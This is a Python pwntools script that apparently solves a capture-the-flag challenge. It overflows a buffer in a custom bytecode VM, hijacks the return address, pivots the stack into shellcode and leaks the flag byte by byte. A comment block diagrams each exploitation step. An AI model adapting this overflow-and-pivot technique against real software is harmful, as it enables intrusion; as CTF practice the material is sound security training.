from pwn import *
import os
os.chdir('../dist')

RAW = read('vm.bin')
jmp = RAW.index(b'\xf5\x04\x00\xe0') # bne rsi, zer, -0x20

def find():
    for target in range(0xde, 0xfe-8):
        try:
            i = RAW[0x21:0x80].index(target) + 0x20
            return (target, i)
        except:
            pass
off, pivot = find()
# print(hex(off), hex(pivot))

'''
1. BOF

rdi                               rbp
↓                                  ↓
A A A A A ... A A 0x20 A A A ... A 0x2E 0x??

2. (after returning from) first scramble (legitimate; affects 0x20 bytes)

rdi                               rbp
↓                                  ↓
! ! ! ! ! ... ! ! 0x00 ! ! ! ... ! 0x2E 0x??

3. first byte check fails, return. BOF hijacks return address to
`bne rsi, zer, scramble_loop`

rsi is currently 0x90 (first byte of FLAG)

4. second scramble (hijacked; teminates at NULL byte)

                 rdi                        rsp
                  ↓                          ↓
###<shellcode>### 0x00 ! ! ! ... ! 0x2E 0x??
                         popped rbp^    ^popped rip
            rbp
             ↓
[0x2C] F5 04 00 E0 F0 06 05 00 ...

5. return from second scramble
`mov rsp, rbp; pop rbp; pop rip`

  rip (0xE0)
   ↓
###<shellcode>### ...

                  rsp
                   ↓
[0x2C] F5 04 00 E0 F0 06 05 00 ...
   popped rbp^  ^popped rip
'''

# mov  rax, [rsi+i]
# exit rax

def craft(i):
    return (
        b'A'*(off-0xde) + bytes(
            (x+0x40)%0x100
            for x in [0xf1, 1, 4, i, 0xf7, 1, 0, 0]
        ) + b' '
    ).ljust(0x20, b'A') + bytes([pivot, jmp])

FLAG = []
for i in range(off-0xde+8, off-0xde+0x28):
    p = process(['python3', 'chal.py'])
    p.sendline(craft(i))
    while True:
        try:
            FLAG.append(int(p.recvline(keepends=False)))
            break
        except:
            continue
    p.close()
print(bytes(FLAG).decode())
